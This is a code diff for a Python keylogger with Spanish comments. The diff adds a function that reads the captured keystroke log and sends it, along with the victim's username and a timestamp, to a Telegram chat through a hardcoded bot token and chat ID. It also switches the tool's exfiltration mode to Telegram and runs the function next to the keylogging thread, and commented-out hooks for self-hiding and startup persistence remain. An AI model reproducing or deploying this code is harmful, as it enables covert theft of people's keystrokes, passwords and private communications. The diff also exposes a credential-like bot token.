@@ -394,7 +394,44 @@ def SendLog():
 
 # Telegram Bot
 def TelegramBot():
-    pass
+    def random_char(y=5):
+           return ''.join(random.choice(string.ascii_letters) for x in range(y))
+
+    pathO = logKeyPath()+ LogName()
+    pathN = logKeyPath()+ random_char(15)+".txt"
+    os.rename(pathO, pathN)
+    # Abre el archivo
+    f = open (pathN ,'r')
+    #data = f.read()
+    #f.close()
+    #print(data)
+    # Tiempo
+    T = datetime.datetime.now()
+
+    #try:
+    currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
+        
+        #sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)"
+    #try:
+    bot = telebot.TeleBot(Token())      # Instancia
+    bot.send_message(ID(),"Usuario: "+str(getuser())
+    bot.send_message(ID(),"Usuario: \nFecha: "+currentTime+"\nRegistro de teclas:")  
+    bot.send_message(ID(),f.read())   #
+            
+    #cursor.execute(sql,(str(getuser()),currentTime,data)) # Ejecuta virtual
+    f.close()
+    #os.remove(pathN)
+    #except:
+    #print("[Telegram] Error al subir los datos")
+    #except:
+    #    try:
+    #        pass
+    #        #os.remove(pathN)  # Borra la carpeta por posible Errores
+    #    except:
+    #        pass
+    #    print("[Telegram] No se encuentra el archivo")
+
+
 
 # ***************************************   ZONA CUSTOM AVANZADA  ***********************************
 
@@ -451,16 +488,17 @@ def DB_PORT():
 
 # ************ End Zone DATABASE ************* 
 def GMailOrDataBase():
-    return 1    # 1 = DataBase 
+    return 2    # 2 = TelegramBot
+                # 1 = DataBase              # Solo se puede usar una opción
                 # 0 = Gmail
-                # (en las proximas actualizaciones , ambas a la vez)
+
 
 def timeSend(): # Tiempo de envío perzonalizado
     return 20 #Minutos                 <= Escoja su tiempo en minutos
 
 # ************ Zone Telegram *************     
 def ID():
-    return "831756903"            # <=  ID de chat telegram 
+    return 831756903            # <=  ID de chat telegram 
 
 def Token():
     return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram
@@ -469,22 +507,15 @@ def Token():
 
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
+
+
 # Inicio multihilo
 if __name__ == '__main__':
     
-    #TelegramBot()
-    bot = telebot.TeleBot("1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8")
-
-    bot.reply_to(ID(), "This is a message handler")
-
-
-
-
-
-
-
+    TelegramBot()
 
     
+
     #EscondeKey()    # Se replica dentro de la computadora
     #addStartup()    # Modifica registro de arranque
     p1 = threading.Thread(target=KeyLogger)   # Registra teclas
@@ -493,7 +524,6 @@ if __name__ == '__main__':
     #p2.start()
     p1.start()
     p1.join()
-
 
 
 
